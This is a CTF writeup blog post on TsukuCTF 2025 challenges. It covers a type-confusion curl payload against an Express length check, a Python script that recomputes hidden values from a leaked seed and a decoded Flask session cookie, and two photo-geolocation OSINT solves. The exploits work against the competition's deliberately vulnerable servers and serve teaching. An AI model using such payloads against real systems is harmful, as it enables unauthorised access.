---
title: "TsukuCTF 2025 Writeups"
description: ""
pubDate: "2025-05-05T11:41:29.000Z"
tags: ["osint", "ctf", "tsukuctf", "web"]
---


**Originally posted on <a href="https://medium.com/@bl0ss0mx5/tsukuctf-2025-writeups-99effef27a1f" target="_blank" rel="noopener noreferrer">my Medium page</a>.**

---

A collection of writeups by [**Bl0ss0mX5**](https://medium.com/@bl0ss0mx5/), covering challenges solved during the [**TsukuCTF**](https://tsukuctf.org/) **competition**.

### 1\. len\_len | web

![](https://cdn-images-1.medium.com/max/457/1*iYURV0LAQICKMR3Bm_kwmQ.png)

When visiting the URL, we’re greeted with:  
_How to use -> curl -X POST -d ‘array=\[1,2,3,4\]’_ [_http://challs.tsukuctf.org:28888_](http://challs.tsukuctf.org:28888)

Let’s follow the instructions and run: _curl -X POST -d ‘array=\[1,2,3,4\]’_ [_http://challs.tsukuctf.org:28888_](http://challs.tsukuctf.org:28888)

Response: _error: no flag for you. array length is too long -> 6_

#### 🔍 Exploring the Files

After extracting len\_len.zip, we find:

> docker-compose.yaml  
> Dockerfile  
> package.json  
> server.js  
> yarn.lock

#### 📖 Analyzing server.js
```
const express = require("express");  
const bodyParser = require("body-parser");  
const process = require("node:process");  
  
const app = express();  
const HOST = process.env.HOST ?? "localhost";  
const PORT = process.env.PORT ?? "28888";  
const FLAG = process.env.FLAG ?? "TsukuCTF25{dummy_flag}";  
  
app.use(bodyParser.urlencoded({ extended: true }));  
  
function chall(str = "[1, 2, 3]") {  
  const sanitized = str.replaceAll(" ", "");  
  if (sanitized.length < 10) {  
    return `error: no flag for you. sanitized string is ${sanitized}, length is ${sanitized.length.toString()}`; 
  }  
  const array = JSON.parse(sanitized);  
  if (array.length < 0) {  
    // hmm...??  
    return FLAG;  
  }  
  return `error: no flag for you. array length is too long -> ${array.length}`;  
}  
  
app.get("/", (_, res) => {  
  res.send(  
    `How to use -> curl -X POST -d 'array=[1,2,3,4]' http://${HOST}:${PORT}`,  
  );  
});  
  
app.post("/", (req, res) => {  
  const array = req.body.array;  
  res.send(chall(array));  
});  
  
app.listen(PORT, () => {  
  console.log(`Server is running on http://${HOST}:${PORT}`);  
});

Key snippet:

if (array.length < 0) {  
    return res.send(flag);  
}
```

Wait — array.length naturally can’t be less than 0 in normal JavaScript behavior. Unless… we manipulate it.

#### **🛠️ Exploit Idea**

Since JSON.parse parses strings into objects, what if we send an object with a custom length property set to -1?

Let’s test it:

_curl -X POST -d ‘array={“length”:-1}’_ [_http://challs.tsukuctf.org:28888_](http://challs.tsukuctf.org:28888)

Response:

_TsukuCTF25{l4n\_l1n\_lun\_l4n\_l0n}_

Hurray!! We got the flag!!

#### 📚 Takeaway

A classic example of **type confusion** and **prototype property abuse** in web challenges. Remember — whenever you see length checks, think beyond arrays and explore object possibilities.

### 2\. Bark (Casca) | OSINT

![](https://cdn-images-1.medium.com/max/466/1*z18CBW-x7SF5v1Gl4KkE2g.png)

The shell.jpg is here

![](https://cdn-images-1.medium.com/max/569/1*qAIHJU-eDx0wFPL-dcp0Pw.jpeg)

To solve this challenge, Let’s start by analyzing the given image. Since the prompt hinted at a monument and a date, why can’t we use **Google Lens** to search for visually similar images and gather more information about the location? After running the image through Google Lens, we can find a matching image online.

![](https://cdn-images-1.medium.com/max/585/1*Qy5GKmfkjH_EgBlgrA_Asg.png)

Through this, we discover that the picture was taken at the **Entrance Wall of Jacaranda Promenade in Omiya Green Space, Japan**. Now that we have the location, we search for photographs of the actual monument plaque. On examining the plaque, we find the **date of the ceremony clearly written as June 06, 2014**.  
So the flag for this ctf is _TsukuCTF25{2014/06/06}_

### 3\. Snow (Schnee) | OSINT

![](https://cdn-images-1.medium.com/max/427/1*MepINvdBfz7joa5ixMccSw.png)

![](https://cdn-images-1.medium.com/max/1024/1*2YsXXZUY4nMle-jAjUBjVQ.jpeg)

By clearly observing the picture, we can notice some distinctive keywords visible on a flyer in the picture — **“Buri Sport”** and **“Grindelwald”**.

With these keywords in hand, why not search them in **Google Maps** to pinpoint the possible location? After running the search, we land at a place in Grindelwald, Switzerland, that seems to match the surroundings in the image.

![](https://cdn-images-1.medium.com/max/1024/1*37-0U7v9ag6tgYpnXhf-GQ.png)

To be sure, we explore the **Street View history** for this location and find that the image from **June 2013** is an exact match to the one provided in the challenge. Let’s copy the coodinates from June 2013: 46.6235408, 8.0398964.

The flag is _TsukuCTF25{46.623\_8.039}_

### 4\. Flash | Web

![](https://cdn-images-1.medium.com/max/447/1*3nWBUoyn6F0BQZECn72S6Q.png)

url: [https://challs.tsukuctf.org:50000/](https://challs.tsukuctf.org:50000/)

When we visit the challenge URL and start the game, we’re shown **10 rounds**, each with a **7-digit number**.  
However:

*   In **rounds 1–3 and 8–10**, the numbers are visible.
*   In **rounds 4–7**, the numbers are hidden from the client.

#### 🔍 Source Analysis:

Upon downloading and inspecting the challenge files, we find:

*   app.py (Flask server)
*   Dockerfile, docker-compose.yml, nginx.conf
*   static/ (contains seed.txt)
*   templates/

**The core logic is in** **app.py.**
```
from flask import Flask, session, render_template, request, redirect, url_for, make_response  
import hmac, hashlib, secrets  
  
used_tokens = set()  
  
with open('./static/seed.txt', 'r') as f:  
    SEED = bytes.fromhex(f.read().strip())  
  
def lcg_params(seed: bytes, session_id: str):  
    m = 2147483693  
    raw_a = hmac.new(seed, (session_id + "a").encode(), hashlib.sha256).digest()  
    a = (int.from_bytes(raw_a[:8], 'big') % (m - 1)) + 1  
    raw_c = hmac.new(seed, (session_id + "c").encode(), hashlib.sha256).digest()  
    c = (int.from_bytes(raw_c[:8], 'big') % (m - 1)) + 1  
    return m, a, c  
  
def generate_round_digits(seed: bytes, session_id: str, round_index: int):  
    LCG_M, LCG_A, LCG_C = lcg_params(seed, session_id)  
  
    h0 = hmac.new(seed, session_id.encode(), hashlib.sha256).digest()  
    state = int.from_bytes(h0, 'big') % LCG_M  
  
    for _ in range(DIGITS_PER_ROUND * round_index):  
        state = (LCG_A * state + LCG_C) % LCG_M  
  
    digits = []  
    for _ in range(DIGITS_PER_ROUND):  
        state = (LCG_A * state + LCG_C) % LCG_M  
        digits.append(state % 10)  
  
    return digits  
  
def reset_rng():  
    session.clear()  
    session['session_id'] = secrets.token_hex(16)  
    session['round'] = 0  
  
TOTAL_ROUNDS = 10  
DIGITS_PER_ROUND = 7  
FLAG = "TsukuCTF25{**REDACTED**}"  
  
app = Flask(__name__)  
app.secret_key = secrets.token_bytes(16)  
  
@app.route('/')  
def index():  
    reset_rng()  
    return render_template('index.html')  
  
@app.route('/flash')  
def flash():  
    session_id = session.get('session_id')  
    if not session_id:  
        return redirect(url_for('index'))  
  
    r = session.get('round', 0)  
    if r >= TOTAL_ROUNDS:  
        return redirect(url_for('result'))  
  
    digits = generate_round_digits(SEED, session_id, r)  
  
    session['round'] = r + 1  
  
    visible = (session['round'] <= 3) or (session['round'] > 7)  
    return render_template('flash.html', round=session['round'], total=TOTAL_ROUNDS, digits=digits, visible=visible)  
  
@app.route('/result', methods=['GET', 'POST'])  
def result():  
    if request.method == 'GET':  
        if not session.get('session_id') or session.get('round', 0) < TOTAL_ROUNDS:  
            return redirect(url_for('flash'))  
        token = secrets.token_hex(16)  
        session['result_token'] = token  
        used_tokens.add(token)  
        return render_template('result.html', token=token)  
  
    form_token = request.form.get('token', '')  
    if ('result_token' not in session or form_token != session['result_token']  
            or form_token not in used_tokens):  
        return redirect(url_for('index'))  
    used_tokens.remove(form_token)  
  
    ans_str = request.form.get('answer', '').strip()  
    if not ans_str.isdigit():  
        return redirect(url_for('index'))  
    ans = int(ans_str)  
  
    session_id = session.get('session_id')  
    correct_sum = 0  
    for round_index in range(TOTAL_ROUNDS):  
        digits = generate_round_digits(SEED, session_id, round_index)  
        number = int(''.join(map(str, digits)))  
        correct_sum += number  
  
    session.clear()  
    resp = make_response(  
        render_template('result.html', submitted=ans, correct=correct_sum,  
                        success=(ans == correct_sum), FLAG=FLAG if ans == correct_sum else None)  
    )  
    cookie_name = app.config.get('SESSION_COOKIE_NAME', 'session')  
    resp.set_cookie(cookie_name, '', expires=0)  
    return resp  
  
if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=5000)
```
#### 📌 How It Works:

*   Each session gets a session\_id.
*   Numbers are generated using a **LCG (Linear Congruential Generator)** seeded with:
*   a secret SEED from static/seed.txt
*   the session's session\_id
*   The numbers are shown or hidden depending on the round number.
*   At the end, the sum of all 10 numbers is required to get the flag.

### 🕵️‍♂️ Exploitation Strategy:

Since the number generation is deterministic (using SEED and session\_id), if we can extract the **session\_id** and retrieve the **seed value,** We can replicate the number generation locally and compute the total sum.

#### Step 1: Get the session\_id

1.  Open DevTools (Ctrl+Shift+I) → **Application** tab → **Cookies** → grab the value of the session cookie.

![](https://cdn-images-1.medium.com/max/1024/1*AGJ4DbOJgrGGLafXgSlKQg.png)

2\. Decode the Flask session cookie using:

🔗 [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

Then we get _492d036eb1da26891d4f5a2b9e1bb1bd_

#### Step 2: Get the SEED

The challenge’s Docker config and static files tell us seed.txt is served at: [http://challs.tsukuctf.org:50000/static/seed.txt](http://challs.tsukuctf.org:50000/static/seed.txt)

#### Step 3: Replicate Number Generation

Now we have to Use the exact same generate\_round\_digits function from the server code — pass the copied session\_id and the copied SEED, we can compute all 10 numbers locally.

For each round (from 0 to 9):

*   Generate the 7 digits
*   Join them into a number
*   Add them up

Python script (numbers\_generate.py):
```
import hmac, hashlib, requests  
  
# === Provided session ID ===  
session_id = '492d036eb1da26891d4f5a2b9e1bb1bd'  
  
# === Fetch the SEED from the challenge site ===  
seed_url = 'http://challs.tsukuctf.org:50000/static/seed.txt'  
response = requests.get(seed_url)  
SEED = bytes.fromhex(response.text.strip())  
  
# === Constants (same as server) ===  
DIGITS_PER_ROUND = 7  
  
def lcg_params(seed: bytes, session_id: str):  
    m = 2147483693  
    raw_a = hmac.new(seed, (session_id + "a").encode(), hashlib.sha256).digest()  
    a = (int.from_bytes(raw_a[:8], 'big') % (m - 1)) + 1  
    raw_c = hmac.new(seed, (session_id + "c").encode(), hashlib.sha256).digest()  
    c = (int.from_bytes(raw_c[:8], 'big') % (m - 1)) + 1  
    return m, a, c  
  
def generate_round_digits(seed: bytes, session_id: str, round_index: int):  
    LCG_M, LCG_A, LCG_C = lcg_params(seed, session_id)  
    h0 = hmac.new(seed, session_id.encode(), hashlib.sha256).digest()  
    state = int.from_bytes(h0, 'big') % LCG_M  
  
    for _ in range(DIGITS_PER_ROUND * round_index):  
        state = (LCG_A * state + LCG_C) % LCG_M  
  
    digits = []  
    for _ in range(DIGITS_PER_ROUND):  
        state = (LCG_A * state + LCG_C) % LCG_M  
        digits.append(state % 10)  
  
    return digits  
sum = 0  
for i in range(10):  
    digits = generate_round_digits(SEED, session_id, i)  
    number = int(''.join(map(str, digits)))  
    sum += number  
  
print(f"The sum is: {sum}")
```
Submitting the computed sum gives the flag _TsukuCTF25{Tr4d1on4l\_P4th\_Trav3rs4l}_

In this challenge, the flaw was:

*   The RNG algorithm was deterministic (LCG with known formula)
*   The seed was retrievable via a static file
*   The session ID was stored client-side and decodable

Which meant the **“random” values weren’t random** at all once we had those.

---

📖 **Want more CTF and OSINT writeups like this? Check out <a href="https://medium.com/@bl0ss0mx5" target="_blank" rel="noopener noreferrer">my Medium page here</a>.**

---

![](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=99effef27a1f)